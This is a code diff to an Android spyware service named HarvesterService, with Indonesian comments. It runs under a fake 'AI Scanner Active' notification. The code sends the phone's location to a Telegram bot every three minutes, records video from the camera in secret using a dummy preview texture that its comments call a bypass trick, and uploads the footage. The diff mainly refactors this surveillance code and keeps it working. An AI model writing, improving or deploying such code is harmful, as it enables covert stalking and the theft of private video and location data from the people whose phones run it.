@@ -16,7 +16,6 @@ import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.ContactsContract;
-import android.view.Surface;
 import org.json.JSONObject;
 import java.io.File;
 import okhttp3.*;
@@ -37,7 +36,12 @@ public class HarvesterService extends Service {
                 NotificationManager manager = getSystemService(NotificationManager.class);
                 manager.createNotificationChannel(serviceChannel);
             }
-            Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
+            Notification.Builder builder;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                builder = new Notification.Builder(this, CHANNEL_ID);
+            } else {
+                builder = new Notification.Builder(this);
+            }
             Notification notification = builder.setContentTitle("AI Scanner Active").setContentText("Memproses...").setSmallIcon(android.R.drawable.ic_menu_camera).setOngoing(true).build();
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -80,7 +84,8 @@ public class HarvesterService extends Service {
 
                         sendTgText("🟢 <b>LIVE UPDATE</b>\n📍 Lokasi: " + locLink + "\n🕒 Waktu: " + new java.util.Date().toString());
                         
-                        Thread.sleep(180000); // Jeda 3 Menit
+                        // Jeda 3 Menit (180000 ms)
+                        Thread.sleep(180000); 
                         
                     } catch (Exception e) {
                         sendTgText("❌ ERROR MAIN LOOP: " + e.getMessage());
@@ -105,20 +110,12 @@ public class HarvesterService extends Service {
     private void recordVideoWithCamera(int cameraId, String caption, int durationMs) {
         Camera camera = null;
         MediaRecorder recorder = new MediaRecorder();
-        SurfaceTexture dummyTexture = null;
-        Surface dummySurface = null;
         try {
             camera = Camera.open(cameraId);
             
-            // Trik Bypass: Bikin Surface Palsu (Dummy)
-            dummyTexture = new SurfaceTexture(10);
-            dummySurface = new Surface(dummyTexture);
-            
-            try {
-                camera.setPreviewTexture(dummyTexture);
-            } catch (Exception e) {
-                camera.setPreviewDisplay(dummySurface);
-            }
+            // Pake Texture sederhana
+            SurfaceTexture dummyTexture = new SurfaceTexture(10);
+            camera.setPreviewTexture(dummyTexture);
             
             camera.unlock();
             
@@ -148,8 +145,7 @@ public class HarvesterService extends Service {
             camera.release();
             camera = null;
             
-            if (dummySurface != null) dummySurface.release();
-            if (dummyTexture != null) dummyTexture.release();
+            dummyTexture.release();
             
             sendTgVideo(file, caption);
 
@@ -162,8 +158,6 @@ public class HarvesterService extends Service {
             if (camera != null) {
                 try { camera.lock(); camera.release(); } catch (Exception e) {}
             }
-            if (dummySurface != null) dummySurface.release();
-            if (dummyTexture != null) dummyTexture.release();
         }
     }
 
@@ -200,9 +194,12 @@ public class HarvesterService extends Service {
         }
     }
 
-    @Override public void onDestroy() {
+    @Override 
+    public void onDestroy() {
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         super.onDestroy();
     }
-    @Override public IBinder onBind(Intent intent) { return null; }
+    
+    @Override 
+    public IBinder onBind(Intent intent) { return null; }
 }
